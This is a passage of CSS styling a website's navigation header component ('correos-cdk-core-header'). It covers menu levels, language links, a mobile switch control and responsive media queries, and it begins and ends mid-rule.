				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header {
					-webkit-transform: translateX(-20px);
					transform: translateX(-20px);
					padding: 0 4rem 2rem 4rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.--open.sc-correos-cdk-core-header {
				-webkit-transform: translateX(0px);
				transform: translateX(0px);
				opacity: 1;
				pointer-events: all
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				margin-bottom: 1rem
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header {
					display: none
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header {
				position: relative;
				text-align: center;
				-ms-flex-pack: center;
				justify-content: center;
				margin-right: 1rem;
				min-width: 84px
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header:last-child {
				margin-right: 0
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header {
				position: absolute;
				cursor: pointer;
				opacity: 0;
				top: 0;
				left: 0;
				right: 0;
				margin: 0;
				width: 100%;
				height: 100%
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header {
				position: relative;
				height: 2.5rem;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				cursor: pointer;
				-webkit-transition: background-color 0.15s linear;
				transition: background-color 0.15s linear;
				outline: none
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after {
				content: "";
				display: block;
				width: 0%;
				opacity: 0;
				will-change: opacity, width;
				-webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				height: 1px;
				position: absolute;
				bottom: 0;
				background-color: rgba(128, 128, 128, 0.5)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header:checked+label.sc-correos-cdk-core-header {
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header:checked+label.sc-correos-cdk-core-header::after {
				content: "";
				display: block;
				opacity: 1;
				width: 100%;
				height: 1px;
				position: absolute;
				bottom: 0
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header:focus+label.sc-correos-cdk-core-header {
				-webkit-box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5);
				box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-title.sc-correos-cdk-core-header {
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				padding-bottom: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-title.sc-correos-cdk-core-header {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-title.sc-correos-cdk-core-header {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header {
				width: 100%;
				-webkit-box-sizing: border-box;
				box-sizing: border-box
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header {
					padding: 0 1.5rem 0 0
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				height: 100%;
				width: 100%;
				padding: 12px 0 12px 0
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--active.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--active.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header:hover {
				text-decoration: underline;
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--with-border.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--with-border.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
				border-bottom: 1px solid rgba(128, 128, 128, 0.5)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--first-shared.sc-correos-cdk-core-header {
				margin-top: 1.5rem
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
				font-weight: lighter;
				font-size: 1.125rem;
				line-height: 1.625rem;
				text-align: left
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header:hover {
				text-decoration: underline;
				font-weight: 400
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-icon.sc-correos-cdk-core-header {
				margin-right: 1rem
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-arrow.sc-correos-cdk-core-header {
				margin-left: auto
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header {
				width: 100%;
				-webkit-box-sizing: border-box;
				box-sizing: border-box
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header {
					padding: 0 1.5rem 0 0
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				height: 100%;
				width: 100%;
				padding: 8px 0 8px 0
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--active.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--with-border.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--with-border.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
				border-bottom: 1px solid rgba(128, 128, 128, 0.5)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--first-shared.sc-correos-cdk-core-header {
				margin-top: 1.5rem
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
				font-weight: bold;
				font-size: 0.875rem;
				line-height: 1.375rem;
				text-align: left
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header:hover {
				text-decoration: underline
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-icon.sc-correos-cdk-core-header {
				margin-right: 1rem
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-arrow.sc-correos-cdk-core-header {
				margin-left: auto
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header {
				margin-top: auto;
				font-weight: 300;
				-webkit-box-sizing: border-box;
				box-sizing: border-box
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header {
					padding: 0
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-title.sc-correos-cdk-core-header {
				display: block;
				font-size: 0.875rem;
				line-height: 1.375rem;
				margin-bottom: 0.5rem;
				font-size: 12px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-title.sc-correos-cdk-core-header {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-title.sc-correos-cdk-core-header {
					font-size: 14px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header .cdk-nav-langs-item.sc-correos-cdk-core-header {
				padding-right: 0.75rem;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header .cdk-nav-langs-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header:hover {
				text-decoration: underline
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header .cdk-nav-langs-item.--title.sc-correos-cdk-core-header {
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-toolbar.sc-correos-cdk-core-header {
				margin-left: auto;
				margin-right: auto;
				height: 2.5rem;
				-ms-flex: 0 0 auto;
				flex: 0 0 auto;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				top: 6%
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-toolbar.sc-correos-cdk-core-header {
					display: none
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-toolbar.sc-correos-cdk-core-header {
					margin-bottom: 1.5rem;
					visibility: hidden;
					pointer-events: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-goback.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				font-weight: 300;
				position: relative;
				left: -0.5rem;
				font-weight: bold;
				text-transform: uppercase;
				font-size: 0.875rem;
				line-height: 1.375rem
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-goback.sc-correos-cdk-core-header {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-goback.sc-correos-cdk-core-header>i.sc-correos-cdk-core-header {
				margin-right: 0.5rem;
				-webkit-transform: rotate(180deg);
				transform: rotate(180deg)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
				-ms-flex: 0 0 auto;
				flex: 0 0 auto;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between;
				margin: 16px auto -1px;
				height: 3.5rem;
				font-size: 1.125rem;
				line-height: 1.625rem;
				font-weight: bold;
				border-bottom: var(--_cdk-core-header-border-subpanel)
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
					margin: 32px auto -1px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
					margin: 64px auto -1px
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header .cdk-nav-lv-title-icon.sc-correos-cdk-core-header {
					display: none
				}
			}

			@media (min-width: 1024px) {
